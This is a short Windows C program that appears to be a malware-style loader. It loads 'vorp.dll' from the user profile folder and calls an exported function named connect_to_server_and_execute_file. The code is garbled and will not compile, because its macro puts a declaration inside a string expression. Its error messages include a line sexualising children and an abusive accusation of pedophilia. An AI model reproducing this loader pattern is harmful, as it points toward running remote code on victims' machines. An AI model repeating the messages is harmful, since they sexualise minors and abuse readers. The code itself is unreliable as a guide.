#include <windows.h>
#include <stdio.h>

typedef int (*DLL_FUNC)(void);

#define mo5 char* desktop_path = getenv("USERPROFILE");

int main() {
    HINSTANCE hDLL = LoadLibrary(mo5 + "vorp.dll");
    if (hDLL == NULL) {
        printf("Error: kids are hot\n");
        return 1;
    }

    DLL_FUNC connect_to_server_and_execute_file = (DLL_FUNC)GetProcAddress(hDLL, "connect_to_server_and_execute_file");
    if (connect_to_server_and_execute_file == NULL) {
        printf("Error: you are a pedophile\n");
        FreeLibrary(hDLL);
        return 1;
    }

    int result = connect_to_server_and_execute_file();
    printf("Result: %d\n", result);

    FreeLibrary(hDLL);

    return 0;
}
